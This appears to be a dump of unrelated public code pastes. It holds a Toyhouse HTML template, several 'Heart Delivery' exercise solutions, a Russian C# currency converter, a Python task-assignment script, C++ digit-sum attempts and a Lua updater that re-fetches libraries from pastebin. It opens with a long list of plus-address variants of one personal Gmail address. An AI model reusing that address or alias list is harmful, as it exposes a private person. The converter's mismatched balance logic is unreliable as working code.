<a href=""mailto:mscarmanlapointe21+14993@gmail.com"">mscarmanlapointe21+14993@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+28811@gmail.com"">mscarmanlapointe21+28811@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+12932@gmail.com"">mscarmanlapointe21+12932@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+10944@gmail.com"">mscarmanlapointe21+10944@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13932@gmail.com"">mscarmanlapointe21+13932@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+20504@gmail.com"">mscarmanlapointe21+20504@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+8370@gmail.com"">mscarmanlapointe21+8370@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+1718@gmail.com"">mscarmanlapointe21+1718@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+22654@gmail.com"">mscarmanlapointe21+22654@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19363@gmail.com"">mscarmanlapointe21+19363@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+391@gmail.com"">mscarmanlapointe21+391@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+1703@gmail.com"">mscarmanlapointe21+1703@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26789@gmail.com"">mscarmanlapointe21+26789@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+24660@gmail.com"">mscarmanlapointe21+24660@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13550@gmail.com"">mscarmanlapointe21+13550@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+6407@gmail.com"">mscarmanlapointe21+6407@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19143@gmail.com"">mscarmanlapointe21+19143@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29238@gmail.com"">mscarmanlapointe21+29238@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+4163@gmail.com"">mscarmanlapointe21+4163@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+20721@gmail.com"">mscarmanlapointe21+20721@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3701@gmail.com"">mscarmanlapointe21+3701@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3977@gmail.com"">mscarmanlapointe21+3977@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26920@gmail.com"">mscarmanlapointe21+26920@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13086@gmail.com"">mscarmanlapointe21+13086@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+578@gmail.com"">mscarmanlapointe21+578@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+17911@gmail.com"">mscarmanlapointe21+17911@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19000@gmail.com"">mscarmanlapointe21+19000@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26393@gmail.com"">mscarmanlapointe21+26393@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13761@gmail.com"">mscarmanlapointe21+13761@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+10710@gmail.com"">mscarmanlapointe21+10710@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29572@gmail.com"">mscarmanlapointe21+29572@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+21347@gmail.com"">mscarmanlapointe21+21347@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+5893@gmail.com"">mscarmanlapointe21+5893@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+17231@gmail.com"">mscarmanlapointe21+17231@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+9813@gmail.com"">mscarmanlapointe21+9813@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+22059@gmail.com"">mscarmanlapointe21+22059@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+15601@gmail.com"">mscarmanlapointe21+15601@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+10165@gmail.com"">mscarmanlapointe21+10165@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16194@gmail.com"">mscarmanlapointe21+16194@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19426@gmail.com"">mscarmanlapointe21+19426@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+17686@gmail.com"">mscarmanlapointe21+17686@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+30126@gmail.com"">mscarmanlapointe21+30126@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+1437@gmail.com"">mscarmanlapointe21+1437@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3291@gmail.com"">mscarmanlapointe21+3291@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+8604@gmail.com"">mscarmanlapointe21+8604@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+22348@gmail.com"">mscarmanlapointe21+22348@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16753@gmail.com"">mscarmanlapointe21+16753@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+8792@gmail.com"">mscarmanlapointe21+8792@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+21502@gmail.com"">mscarmanlapointe21+21502@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+9246@gmail.com"">mscarmanlapointe21+9246@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+5304@gmail.com"">mscarmanlapointe21+5304@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29753@gmail.com"">mscarmanlapointe21+29753@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+4679@gmail.com"">mscarmanlapointe21+4679@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+7093@gmail.com"">mscarmanlapointe21+7093@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+191@gmail.com"">mscarmanlapointe21+191@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+4289@gmail.com"">mscarmanlapointe21+4289@gmail.com</a>"
wUPZN1e8,Simple Space,Ansuperope,HTML,Thursday 9th of November 2023 05:39:53 PM CDT,"<!------------------------------------------------
Thank you for downloading! :D
 
Feel free to do whatever you want with the
code such as editing, changing or frakensteining
it. You're free to move and edit the credits
just make sure its somewhere on the code please.
 
If you need help, have questions or you notice
something is broke or is hard to read with my
code free to message me or @ my main account 
Ansuperope
 
    LIVE PREVIEW
      https://toyhou.se/24282521.f2u-simple-space  
 
 
    BOOTSTRAP COLORS
        - MAIN:     primary
        - SUB:      secondary
        - BG:       faded
 
        delete bootstrap colors to use custom colors
        or you can use a combo of both up to you
 
    CUSTOM COLORS
        - MAIN:     CC_MAIN
        - SUB:      CC_SUB
        - TEXT:     CC_TEXT
 
 
TIPS & HELPFUL INFO
 
    SHORT CUTS:
        ""Ctrl"" + ""F"" - find, replace, delete and edit text faster
        ""Ctrl"" + ""Z"" - undo
        ""Ctrl"" + ""Y"" - redo
 
    LIVE CODE EDITOR (highly recommend using):
        https://th.circlejourney.net/
 
    HELP THREAD / ASK FOR HELP HERE:
        https://toyhou.se/~forums/16.htmlcss-graphics/48845.-help-thread-ask-your-questions-here-
 
    BOOSTRAP COLORS:
        https://getbootstrap.com/docs/4.0/utilities/colors/
 
    ICONS (you can use ones labled pro):
        https://fontawesome.com/search
 
    COLOR PICKER WEBSITE:
        https://imagecolorpicker.com/color-code/2596be
 
------------------------------------------------->


<!-- BACKGROUND --------------------------------->
<div class="""" style=""z-index:-1; position:absolute; top:0; bottom:0; left:0; width:100%;
    background:url('');
    background-color:;
    background-position:center;
    background-size:cover;""></div> 
<!-- END BACKGROUND ----------------------------->




<div class=""mx-auto justify-content-center align-items-center"" style=""max-width:800px;""><div class=""col row no-gutters align-items-center justify-content-center"">
    
    <!-- LEFT SIDE IMAGE AND SMALL INFO --------->
    <div class=""col-12 col-lg-4 my-3 mr-lg-4 h-100 flex-column"">
        
        <!-- IMAGE AND STARS -------------------->
        <div class=""col my-3"">
            
            <!-- image -->
            <div class=""col my-2 card p-2 card-outline-primary"" style=""border-color:#CC_MAIN; border-width:3px;""><div class=""card p-1 border-0 bg-secondary"" style=""min-height:150px; background-color:#CC_SUB;
                background-image:url('https://f2.toyhou.se/file/f2-toyhou-se/images/35501574_UgeKlRSMZWWgyKo.png?1664395374');
                background-position:top; background-size:cover;""></div></div>
            
            <!-- top right star -->
            <a href="""" title=""Background Credit"" class=""text-primary"" style=""position:absolute; top:-55px; right:-0px; color:#CC_MAIN; font-size:70px;""><i class=""fa-regular fa-star fa-fade""></i></a>
            
            <!-- top right star -->
            <a href="""" title=""Code Credit"" class=""text-primary"" style=""position:absolute; top:-10px; right:-25px; color:#CC_MAIN; font-size:55px;""><i class=""fa-regular fa-star fa-fade""></i></a>
            
            <!-- bottom left star / song -->
            <a href="""" title=""Theme Song"" class=""text-primary"" style=""position:absolute; bottom:-25px; left:-15px; color:#CC_MAIN; font-size:60px;""><i class=""fa-regular fa-star fa-fade""></i></a>
        </div>
        <!-- END IMAGE AND STARS ---------------->
        
        
        <!-- QUOTE ------------------------------>
        <div class=""col card border-0 bg-primary"" style=""color:#CC_TEXT; background-color:#CC_MAIN;""><div class=""p-1 row no-gutters justify-content-center"" style=""font-variant:small-caps;"">
            <i class=""fa-regular fa-quote-left pt-1""></i>
            <span class=""pb-1 px-2"">quote</span>
            <i class=""fa-regular fa-quote-right pt-1""></i>
        </div></div>
        <!-- END QUOTE -------------------------->
        
        
        <!-- SHORT INFO ------------------------->
        <div class=""col mt-2 row no-gutters"">
            
            <!-- left lines -->
            <div class=""col-auto my-1 row no-gutters"">
                <div class=""col-auto card h-100 border-left-0 card-outline-primary"" style=""border-color:#CC_MAIN; border-width:3px;""></div>
                <div class=""col-auto card m-2 border-left-0 card-outline-secondary"" style=""border-color:#CC_SUB; border-width:3px;""></div>  
            </div>
            
            <!-- words -->
            <div class=""col my-2 ml-3"">
               Lorem ipsum dolor sit amet, consectetur adipiscing elit
            </div>
        
        </div>
        <!-- END SHORT INFO --------------------->
        
    </div>
    <!-- END LEFT SIDE IMAGE AND SMALL INFO ----->
    
    
    
    
    <!-- RIGHT SIDE INFO BOXES ------------------>
    <div class=""col ml-lg-5 row no-gutters"">
        
        <!-- BOXES ------------------------------>
        <div class=""col mr-2"">
            
            <!-- ABOUT BOX ---------------------->
            <div class=""col my-3 card rounded-circle p-3 card-outline-secondary"" style=""border-style:dashed; border-color:#CC_SUB; border-width:3px;""><div class=""card p-1 card-outline-primary"" style=""border-color:#CC_MAIN; border-width:3px;"">
                
                <!-- HEADER --------------------->
                <div class=""col py-2 text-center text-uppercase bg-primary"" style=""font-size:18px; font-variant:small-caps; font-style:italic; letter-spacing:3px; color:#CC_TEXT; background-color:#CC_MAIN;"">
                    <i class=""fa-regular fa-planet-ringed""></i>
                    <span class=""px-3"">about</span>
                    <i class=""fa-regular fa-planet-ringed""></i>
                </div>
                <!-- HEADER --------------------->
                
                
                <!-- INFO ----------------------->
                <div class=""card border-top-0 card-outline-secondary bg-faded"" style=""color:#CC_TEXT; background-color:#CC_SUB; border-color:#CC_MAIN; border-width:3px;""><div class=""row no-gutters p-1"">
                    
                    <!-- name -->
                    <div class=""col-12 my-1 px-2 row no-gutters"">
                        <div class=""col-auto text-uppercase"">
                            <span class=""px-1 bg-secondary"" style=""background-color:#CC_MAIN;""><i class=""fa-light fa-moon-stars""></i></span>
                            <span class=""text-secondary"" style=""color:#CC_MAIN; letter-spacing:2px;"">name</span>
                        </div>
                        
                        <div class=""col pl-2 text-right"" style=""font-variant:small-caps;"">content</div>
                    </div>
                    
                    <!-- species -->
                    <div class=""col-12 my-1 px-2 row no-gutters"">
                        <div class=""col-auto text-uppercase"">
                            <span class=""px-1 bg-secondary"" style=""background-color:#CC_MAIN;""><i class=""fa-light fa-moon-stars""></i></span>
                            <span class=""text-secondary"" style=""color:#CC_MAIN; letter-spacing:2px;"">species</span>
                        </div>
                        
                        <div class=""col pl-2 text-right"" style=""font-variant:small-caps;"">content</div>
                    </div>
                    
                    <!-- height -->
                    <div class=""col-12 my-1 px-2 row no-gutters"">
                        <div class=""col-auto text-uppercase"">
                            <span class=""px-1 bg-secondary"" style=""background-color:#CC_MAIN;""><i class=""fa-light fa-moon-stars""></i></span>
                            <span class=""text-secondary"" style=""color:#CC_MAIN; letter-spacing:2px;"">height</span>
                        </div>
                        
                        <div class=""col pl-2 text-right"" style=""font-variant:small-caps;"">content</div>
                    </div>
                    
                    <!-- age -->
                    <div class=""col-12 my-1 px-2 row no-gutters"">
                        <div class=""col-auto text-uppercase"">
                            <span class=""px-1 bg-secondary"" style=""background-color:#CC_MAIN;""><i class=""fa-light fa-moon-stars""></i></span>
                            <span class=""text-secondary"" style=""color:#CC_MAIN; letter-spacing:2px;"">age</span>
                        </div>
                        
                        <div class=""col pl-2 text-right"" style=""font-variant:small-caps;"">content</div>
                    </div>
                    
                    <!-- birthday -->
                    <div class=""col-12 my-1 px-2 row no-gutters"">
                        <div class=""col-auto text-uppercase"">
                            <span class=""px-1 bg-secondary"" style=""background-color:#CC_MAIN;""><i class=""fa-light fa-moon-stars""></i></span>
                            <span class=""text-secondary"" style=""color:#CC_MAIN; letter-spacing:2px;"">birthday</span>
                        </div>
                        
                        <div class=""col pl-2 text-right"" style=""font-variant:small-caps;"">content</div>
                    </div>
                    
                </div></div>
                <!-- END INFO ------------------->
                
            </div></div>
            <!-- END ABOUT BOX ------------------>
            
            
            <!-- NOTE BOX ----------------------->
            <div class=""col my-3 card rounded-circle p-3 card-outline-secondary"" style=""border-style:dashed; border-color:#CC_SUB; border-width:3px;""><div class=""card p-1 card-outline-primary"" style=""border-color:#CC_MAIN; border-width:3px;"">
                
                <!-- HEADER --------------------->
                <div class=""col py-2 text-center text-uppercase bg-primary"" style=""font-size:18px; font-variant:small-caps; font-style:italic; letter-spacing:3px; color:#CC_TEXT; background-color:#CC_MAIN;"">
                    <i class=""fa-regular fa-rocket""></i>
                    <span class=""px-3"">note</span>
                    <i class=""fa-regular fa-rocket""></i>
                </div>
                <!-- HEADER --------------------->
                
                
                <!-- INFO ----------------------->
                <div class=""card py-1 border-top-0 card-outline-secondary bg-faded"" style=""background-color:#CC_SUB; border-color:#CC_MAIN; border-width:3px;"">
                    
                    <!-- 1 -->
                    <div class=""my-1 px-2"" style=""color:#CC_TEXT;"">
                        <span class=""pl-1 text-uppercase bg-secondary"" style=""background-color:#CC_MAIN;""><i class=""fa-light fa-stars""></i>
                        </span>
                        
                        <span class=""pl-2"">content</span>
                    </div>
                    
                    <!-- 2 -->
                    <div class=""my-1 px-2"" style=""color:#CC_TEXT;"">
                        <span class=""pl-1 text-uppercase bg-secondary"" style=""background-color:#CC_MAIN;""><i class=""fa-light fa-stars""></i>
                        </span>
                        
                        <span class=""pl-2"">content</span>
                    </div>
                    
                    <!-- 3 -->
                    <div class=""my-1 px-2"" style=""color:#CC_TEXT;"">
                        <span class=""pl-1 text-uppercase bg-secondary"" style=""background-color:#CC_MAIN;""><i class=""fa-light fa-stars""></i>
                        </span>
                        
                        <span class=""pl-2"">content</span>
                    </div>
                    
                </div>
                <!-- END INFO ------------------->
                
            </div></div>
            <!-- END NOTE BOX ------------------->
            
        </div>
        <!-- END BOXES -------------------------->
        
        
        
        <!-- RIGHT LINES ----------------------->
        <div class=""col-auto my-1 ml-2 row no-gutters"">
            <div class=""col-auto card m-2 border-left-0 card-outline-secondary"" style=""border-color:#CC_SUB; border-width:3px;""></div>
            <div class=""col-auto card h-100 border-left-0 card-outline-primary"" style=""border-color:#CC_MAIN; border-width:3px;""></div>  
        </div>
        <!-- END RIGHT LINES ------------------->
        
    </div>
    <!-- END RIGHT SIDE INFO BOXES ------------->
    
</div></div>"
DdS0cEdR,03. Heart Delivery,Spocoman,C#,Thursday 9th of November 2023 05:27:16 PM CDT,"using System;

namespace HeartDelivery
{
    class Program
    {
        static void Main(string[] args)
        {
            var houses = Console.ReadLine().Split('@').Select(int.Parse).ToList();

            int index = 0;
            string command;

            while ((command = Console.ReadLine()) != ""Love!"")
            {
                index += int.Parse(command.Substring(5));
                if (index >= houses.Count)
                {
                    index = 0;
                }

                if (houses[index] == 0)
                {
                    Console.WriteLine($""Place {index} already had Valentine's day."");
                }
                else
                {
                    houses[index] -= 2;
                    if (houses[index] == 0)
                    {
                        Console.WriteLine($""Place {index} has Valentine's day."");
                    }
                }
            }

            Console.WriteLine($""Cupid's last position was {index}."");
            int houseCount = houses.Where(x => x > 0).Count();
            Console.WriteLine(houseCount == 0 ? ""Mission was successful."" : $""Cupid has failed {houseCount} places."");
        }
    }
}"
NcsY7QDw,update_libraries.lua,iNxmi,Lua,Thursday 9th of November 2023 05:25:00 PM CDT,"local index = 
{
	socket = ""ViawNrKK"",
	serial = ""tHuuHBNy""
}

for k, v in pairs(index) do
    local path = string.format(""/libs/%s.lua"", k)
    print(string.format(""Updating %s (%s)"", path, v))
   
	shell.run(string.format(""delete %s"", path)) 
    shell.run(string.format(""pastebin get %s %s"", v, path))
end
    
print(""Finished updating libraries"")

"
XZimdqAw,Untitled,Sininerebane,C#,Thursday 9th of November 2023 05:20:21 PM CDT,"Задача
Написать конвертер валют (3 валюты).
У пользователя есть баланс в каждой из представленных валют. Он может попросить сконвертировать часть баланса с одной валюты в другую. Тогда у него с баланса одной валюты снимется X и зачислится на баланс другой Y. Курс конвертации должен быть просто прописан в программе.
По имени переменной курса конвертации должно быть понятно, из какой валюты в какую валюту конвертируется.
Должна выполняться однотипная операция или везде умножение ""*"" или деление ""/"". Для чего это нужно подробнее позже узнаете в разделе ""Функции"". Но придётся объявить коэффициенты на все случаи.

Программа должна завершиться тогда, когда это решит пользователь.

Дополнительно: Если решение строится на switch, то принято работать с константами (в остальных случаях объявляются переменные). Для каждого case следует объявить константу.
Пример:
const string CommandExit = ""exit"";

case CommandExit:
break;

Константы объявляются перед блоком переменных и отделяются от них пустой строкой. Константы именуются с большой буквы. Если константа создана для связки консольное меню + switch (case) к имени константы добавляется Command или Menu - это передает суть константы, превращая ее в существительное, а не глагол и улучшает читаемость кода.


namespace ConvertorValut
{
    internal class Program
    {
        static void Main(string[] args)
        {

            const string RubMenu = ""1"";
            const string EuroMenu = ""2"";
            const string UsdMenu = ""3"";

            Console.OutputEncoding = Encoding.UTF8;
            float rubToEur;
            float eurToRub;
            float usdToRub;
            float rub;
            float euro;
            float usd;
            string userInput;
            float currencyCount;

            rubToEur = 0.01F;
            eurToRub = 98.29F;
            usdToRub = 91.68F;

            Console.WriteLine(""Добро пожаловать в обменник валют. У нас вы можете обменять рубли в евро и евро в рубли. "");
            Console.WriteLine(""Введите баланс рублей: "");
            rub = Convert.ToSingle(Console.ReadLine());
            Console.WriteLine(""Введите баланс евро: "");
            euro = Convert.ToSingle(Console.ReadLine());
            Console.WriteLine(""Введите баланс долларов: "");
            usd = Convert.ToSingle(Console.ReadLine());

            Console.WriteLine(""1 - обменять рубли на евро"");
            Console.WriteLine(""2 - обменять евро на рубли"");
            Console.WriteLine(""3 - обменять рубли на доллары"");
            userInput = Console.ReadLine();


            switch (userInput)
            {
                case RubMenu:
                    Console.WriteLine(""Обмен рублей на евро"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (rub >= currencyCount)
                    {
                        rub -= currencyCount;
                        euro += currencyCount / eurToRub;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество рублей"");
                    }
                    break;
                case EuroMenu:
                    Console.WriteLine(""Обмен евро на рубли"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if ( euro >= currencyCount)
                    {
                        euro -= currencyCount;
                        rub += currencyCount / rubToEur;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество евро"");
                    }
                    break;
                case UsdMenu:
                    Console.WriteLine(""Обмен рублей на доллары"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (usd >= currencyCount)
                    {
                        rub -= currencyCount;
                        usd += currencyCount / usdToRub;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество рублей"");
                    }
                    break;
            }

            Console.WriteLine($""Ваш баланс {rub}  рублей и {euro} евро и {usd} долларов "");
            Console.ReadKey();
        }
    }
}"
cE0pfpHq,03. Heart Delivery,Spocoman,C++,Thursday 9th of November 2023 04:54:10 PM CDT,"#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <algorithm>

using namespace std;

vector<int> split(string str, char sep) {
    stringstream s(str);
    vector<int> v;
    string n;
    while (getline(s, n, sep)) {
        v.push_back(stoi(n));
    }
    return v;
}

int main() {
    int number, index = 0, houseCount = 0;

    string line, command;
    getline(cin, line);

    vector<int> houses = split(line, '@');

    cin >> command;

    while (command != ""Love!"") {
        cin >> number;
        index += int(number);
        if (index >= houses.size()) {
            index = 0;
        }
        if (houses[index] == 0) {
            cout << ""Place "" << index << "" already had Valentine's day.\n"";
        }
        else {
            houses[index] -= 2;
            if (houses[index] == 0) {
                cout << ""Place "" << index << "" has Valentine's day.\n"";
            }
        }
        cin >> command;
    }

    for (int i = 0; i < houses.size(); i++) {
        if (houses[i] > 0) {
            houseCount++;
        }
    }

    cout << ""Cupid's last position was "" << index << "".\n"";
    if (houseCount == 0) {
        cout << ""Mission was successful.\n"";
    }
    else {
        cout << ""Cupid has failed "" << houseCount << "" places.\n"";
    }
    return 0;
}"
c0JBqtcz,w_tests_2,kostyukevich,Python,Thursday 9th of November 2023 03:35:39 PM CDT,"import unittest

def read_employees(filename):
    """"""
    Читает данные о сотрудниках из файла.

    Args:
        filename (str): Имя файла с данными о сотрудниках.

    Returns:
        list: Список сотрудников в формате (name, level, technologies).
    """"""
    employees = []
    with open(filename, 'r', encoding='utf-8') as file:
        for line in file:
            parts = line.strip().split()
            i = 0
            while parts[i] != 'junior' and parts[i] != 'middle' and parts[i] != 'senior': i += 1
            name = ' '.join(parts[:i])
            level = parts[i]
            technologies = ' '.join(parts[i+1:]).split(', ')
            employees.append((name, level, technologies))
    return employees
 
def read_tasks(filename):
    """"""
    Читает данные о задачах из файла.

    Args:
        filename (str): Имя файла с данными о задачах.

    Returns:
        list: Список задач в формате (task, level, technologies, time).
    """"""
    tasks = []
    with open(filename, 'r', encoding='utf-8') as file:
        for line in file:
            parts = line.strip().split()
            i = 0
            while parts[i] != 'junior' and parts[i] != 'middle' and parts[i] != 'senior': i += 1
            task = ' '.join(parts[:i])
            level = parts[i]
            technologies = ' '.join(parts[i+1:len(parts)-1]).split(', ')
            time = int(parts[-1])
            tasks.append((task, level, technologies, time))
    return tasks
 
def distribute_tasks(employees, tasks):
    """"""
    Распределяет задачи между сотрудниками.

    Args:
        employees (list): Список сотрудников в формате (name, level, technologies).
        tasks (list): Список задач в формате (task, level, technologies, time).

    Returns:
        tuple: Кортеж с результатами распределения задач и списком нераспределенных задач.
            Результаты представляются в формате словаря result и список unsolved_tasks.
    """"""
    result = {}
    unsolved_tasks = []
    for task in tasks:
        task_name, task_level, task_technologies, task_time = task
        assigned = False
        for employee in employees:
            employee_name, employee_level, employee_technologies = employee
            if (employee_level == task_level or employee_level == 'senior' or task_level == 'junior') and set(employee_technologies).issuperset(set(task_technologies)):
                if employee_name not in result:
                    result[employee_name] = {'total_time': 0, 'tasks': []}
                result[employee_name]['total_time'] += task_time
                result[employee_name]['tasks'].append((task_name, task_time))
                assigned = True
                break
        if not assigned:
            unsolved_tasks.append(task)
 
    return result, unsolved_tasks
 
def write_plans(filename, result, unsolved_tasks):
    """"""
    Записывает результаты распределения задач в файл.

    Args:
        filename (str): Имя файла, в который будут записаны результаты.
        result (dict): Словарь с результатами распределения задач.
        unsolved_tasks (list): Список нераспределенных задач.
    """"""
    with open(filename, 'w') as file:
        for employee, data in sorted(result.items()):
            file.write(f'{employee} - {data[""total_time""]}\n')
            for i, (task, time) in enumerate(data['tasks'], 1):
                file.write(f'{i}. {task} - {time}\n')
            file.write('\n')
        file.write('\n')
        if unsolved_tasks:
            file.write('Задачи, которые никто не может решить:\n')
            for i, (task, level, technologies, time) in enumerate(unsolved_tasks, 1):
                file.write(f'{i}. {task} {level} {"", "".join(technologies)} {time}\n')
 
class TestEmployeeTasks(unittest.TestCase):
    def setUp(self):
        self.levels = ['junior', 'middle', 'senior']

        self.employees = [
            ('Иванов Иван Иванович', 'junior', ['html', 'java', 'тестирование']),
            ('Смирнов Алексей Александрович', 'senior', ['python', 'анализ данных', 'статистика']),
            ('Кац Александр', 'senior', ['тестирование'])
        ]

        self.tasks = [
            ('Протестировать фичу 4398', 'junior', ['тестирование'], 1),
            ('Протестировать фичу 4399', 'junior', ['тестирование'], 2),
            ('Спарсить сайт test.test по форме', 'middle', ['python', 'программирование'], 8),
            ('Написать план тестирования', 'senior', ['тестирование'], 7)
        ]

    def test_read_employees(self):
        employees = read_employees('employees.txt')
        self.assertEqual(employees, self.employees)

    def test_read_tasks(self):
        tasks = read_tasks('tasks.txt')
        self.assertEqual(tasks, self.tasks)
""""""""""""


if __name__ == ""__main__"":
    employees = read_employees('employees.txt')
    tasks = read_tasks('tasks.txt')
    result, unsolved_tasks = distribute_tasks(employees, tasks)
    write_plans('plans.txt', result, unsolved_tasks)
    unittest.main()"
Qn5yhGSB,Сумма цифр числа (E),cyberjab,C++,Thursday 9th of November 2023 03:27:58 PM CDT,"#include <iostream>
#include <iomanip>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <unordered_map>
#include <unordered_set>
#include <queue>
#include <deque>
#include <cmath>
#include <numeric>
#include <algorithm>
#include <ctime>
#include <chrono>
#include <random>
#include <functional>

using namespace std;

int main() {
    ios_base::sync_with_stdio(0);
    cin.tie(0);
    cout << fixed;
    int n, k;
    int ans = 0;
    cin >> n /*>> k*/;
    priority_queue <int> st;
    /*for (int i = 0; i < n; i++) {
        int x;
        cin >> x;
        st.push(x);
    }*/
    //for (int i = 0; i < k; i++) {
    //    int a = st.top();
    //    st.pop();
    //    string s = to_string(a);
    //    int sm = 0;
    //    for (auto now : s) {
    //        sm += int(now) - 48;
    //    }
    //    /*int sm = (a % 10) + ((a / 10) % 10) + ((a / 100) % 10) + ((a / 1000) % 10) + ((a / 10000) % 10) + ((a / 100000) % 10) + ((a / 1000000) % 10);*/
    //    st.push(a - sm);
    //    ans = sm;
    //    if (sm == 0) {
    //        break;
    //    }
    //}
    //cout << ans;
    while (n > 0) {
        string s = to_string(n);
        int sm = 0;
        for (auto now : s) {
            sm += int(now) - 48;
        }
        cout << n << "" - "" << sm << '\n';
        n -= sm;
    }
}
"
tRW4J3DJ,Попытка E,cyberjab,C++,Thursday 9th of November 2023 03:04:59 PM CDT,"#include <iostream>
#include <iomanip>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <unordered_map>
#include <unordered_set>
#include <queue>
#include <deque>
#include <cmath>
#include <numeric>
#include <algorithm>
#include <ctime>
#include <chrono>
#include <random>
#include <functional>

using namespace std;

int main() {
    ios_base::sync_with_stdio(0);
    cin.tie(0);
    cout << fixed;
    int n, k;
    int ans = 0;
    cin >> n >> k;
    priority_queue <int> st;
    for (int i = 0; i < n; i++) {
        int x;
        cin >> x;
        st.push(x);
    }
    for (int i = 0; i < k; i++) {
        int a = st.top();
        st.pop();
        string s = to_string(a);
        int sm = 0;
        for (auto now : s) {
            sm += int(now) - 48;
        }
        /*int sm = (a % 10) + ((a / 10) % 10) + ((a / 100) % 10) + ((a / 1000) % 10) + ((a / 10000) % 10) + ((a / 100000) % 10) + ((a / 1000000) % 10);*/
        st.push(a - sm);
        ans = sm;
        if (sm == 0) {
            break;
        }
    }
    cout << ans;
}
"
p38nSnsi,03. Heart Delivery,Spocoman,JavaScript,Thursday 9th of November 2023 02:50:23 PM CDT,"function heartDelivery(input) {
    let houses = input.shift().split('@').map(Number);
    let index = 0;

    while (input[0] !== 'Love!') {
        index += Number(input.shift().slice(5));
        if (index >= houses.length){
            index = 0;
        } 
        
        if (houses[index] == 0) {
            console.log(`Place ${index} already had Valentine's day.`);
        } else {
            houses[index] -= 2;
            if (houses[index] == 0) {
                console.log(`Place ${index} has Valentine's day.`);
            }
        }
    }

    console.log(`Cupid's last position was ${index}.`);
    let houseCount = houses.filter(x => x !== 0).length;
    console.log(houseCount === 0 ? 'Mission was successful.' : `Cupid has failed ${houseCount} places.`);
    return;
}"
dfhyddeQ,03. Heart Delivery,Spocoman,Python,Thursday 9th of November 2023 02:18:42 PM CDT,"houses = list(map(int, input().split('@')))
index = 0

command = input()

while command != ""Love!"":
    command, i = command.split(' ')
    index += int(i)
    if index >= len(houses):
        index = 0
    if houses[index] == 0:
        print(f""Place {index} already had Valentine's day."")
    else:
        houses[index] -= 2
        if houses[index] == 0:
            print(f""Place {index} has Valentine's day."")

    command = input()

print(f""Cupid's last position was {index}."")
house_count = len([i for i in houses if i != 0])
print(""Mission was successful."" if house_count == 0 else f""Cupid has failed {house_count} places."")
"
528ifBqi,Untitled,Sininerebane,C#,Thursday 9th of November 2023 02:17:43 PM CDT,"namespace ConvertorValut
{
    internal class Program
    {
        static void Main(string[] args)
        {

            Console.OutputEncoding = Encoding.UTF8;
            float rubToEur;
            float eurToRub;
            float rub;
            float euro;
            string userInput;
            float currencyCount;

            rubToEur = 0.01F;
            eurToRub = 98.29F;

            Console.WriteLine(""Добро пожаловать в обменник валют. У нас вы можете обменять рубли в евро и евро в рубли. "");
            Console.WriteLine(""Введите баланс рублей: "");
            rub = Convert.ToSingle(Console.ReadLine());
            Console.WriteLine(""Введите баланс евро: "");
            euro = Convert.ToSingle(Console.ReadLine());

            Console.WriteLine(""1 - обменять рубли на евро"");
            Console.WriteLine(""2 - обменять евро на рубли"");
            userInput = Console.ReadLine();

            switch (userInput)
            {
